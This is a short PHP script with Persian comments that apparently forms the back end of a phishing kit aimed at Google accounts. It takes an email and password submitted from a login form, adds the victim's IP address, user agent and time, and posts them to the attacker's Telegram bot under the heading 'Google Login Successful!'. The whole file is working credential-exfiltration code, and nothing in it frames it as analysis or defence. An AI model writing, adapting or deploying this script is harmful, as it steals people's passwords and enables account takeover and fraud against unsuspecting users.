<?php
// send_telegram.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

require_once 'config.php';

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if (empty($email) || empty($password)) {
    echo json_encode(['success' => false, 'message' => 'اطلاعات کامل نیست']);
    exit;
}

// ارسال به تلگرام
$message = "🔔 **Google Login Successful!**\n\n" .
           "📧 **Email:** `$email`\n" .
           "🔑 **Password:** `$password`\n\n" .
           "🕐 **Time:** " . date('Y-m-d H:i:s') . "\n" .
           "🌐 **IP:** " . $_SERVER['REMOTE_ADDR'] . "\n" .
           "📱 **Device:** " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";

$data = [
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data),
        'timeout' => 5 // timeout 5 ثانیه
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === false) {
    echo json_encode(['success' => false, 'message' => 'خطا در ارسال به تلگرام']);
} else {
    echo json_encode(['success' => true, 'message' => 'اطلاعات ارسال شد']);
}
?>